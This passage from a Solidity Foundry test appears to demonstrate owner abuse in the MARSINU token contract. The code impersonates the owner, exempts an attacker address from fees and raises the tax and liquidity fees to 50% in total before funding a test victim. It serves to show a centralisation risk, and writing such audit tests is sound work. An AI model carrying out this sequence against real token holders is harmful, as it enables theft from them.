        // Step 1: Get owner address
        address owner = MARSINU(TARGET).owner();
        console.log("Owner address:", owner);
        console.log("Attacker address:", attacker);

        // Check initial fee settings
        console.log("Initial tax fee:", MARSINU(TARGET)._taxFee());
        console.log("Initial liquidity fee:", MARSINU(TARGET)._liquidityFee());

        // Step 2: Impersonate owner to set up the exploit
        vm.startPrank(owner);

        // Exclude attacker from fees
        MARSINU(TARGET).excludeFromFee(attacker);
        console.log("Excluded attacker from fees");

        // Set fees to abusive levels (25% each = 50% total)
        MARSINU(TARGET).setTaxFeePercent(25);
        MARSINU(TARGET).setLiquidityFeePercent(25);
        console.log("Set tax fee to 25%, liquidity fee to 25% (50% total)");

        vm.stopPrank();

        // Verify fee settings
        console.log("New tax fee:", MARSINU(TARGET)._taxFee());
        console.log("New liquidity fee:", MARSINU(TARGET)._liquidityFee());

        // Create a simple victim with a reasonable token amount
        // Use a fresh address to avoid any pre-existing state
        address simpleVictim = address(0x999);
        vm.label(simpleVictim, "Simple Victim");

        // Give victim a reasonable amount of tokens (well below maxTxAmount)
        // Let's use 1,000,000 * 10^9 raw units (accounting for 9 decimals)
        uint256 victimAmount = 1_000_000 * 10**9;
        deal(TARGET, simpleVictim, victimAmount);

